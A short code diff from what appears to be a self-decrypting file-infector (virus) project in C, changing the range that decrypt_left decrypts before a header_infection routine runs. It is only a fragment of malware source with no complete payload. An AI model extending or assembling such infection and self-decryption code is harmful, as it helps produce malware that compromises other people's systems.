@@ -75,7 +75,8 @@ void note_infection(struct s_host *host, struct s_keychain *keychain)
 	host->note = &note;
 
 	update_keychain_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
-	decrypt_left(keychain, (char *)header_infection, (void *)__exit - (void *)header_infection);
+	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+
 	header_infection(host, keychain);
 
 label_error:
